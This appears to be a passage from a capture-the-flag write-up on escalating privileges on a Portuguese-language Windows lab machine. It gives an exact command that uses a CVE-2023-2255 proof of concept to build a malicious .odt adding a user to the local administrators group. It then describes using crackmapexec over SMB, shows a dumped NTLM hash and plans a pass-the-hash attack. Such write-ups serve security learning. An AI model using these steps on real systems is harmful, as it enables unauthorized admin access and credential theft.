...
* Use the PoC to make a bad `.odt` file that injects the `cmd` to add maya to local `Administradores` group.
    ...
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code>python3 CVE-2023-2255.py  --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'</code>
...
<i class="fa-solid fa-dumpster-fire" style="color: #fb4934;"></i> <b>NOTICE:</b> Its not `Administrators` but `Administradores`. its in portuguese. If you do `Administrators (English)` it will not work!
...
* Since we have administrator rights to `maya` lets bust out one of our trusty windows tools `crackmapexec`.
    ...
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> We are going to connect to the SMB we discovered in our Recon during initial engagement.
	   ...
	   <code>139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</code>

	   <code>445/tcp   open  microsoft-ds? syn-ack ttl 127</code>
...
* We successfully dump the `localadmin` hash. Now we can perform a `pass the hash` attack and remote into the box with this hash.
    ...
    {%highlight markdown%}localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
    {%endhighlight%}
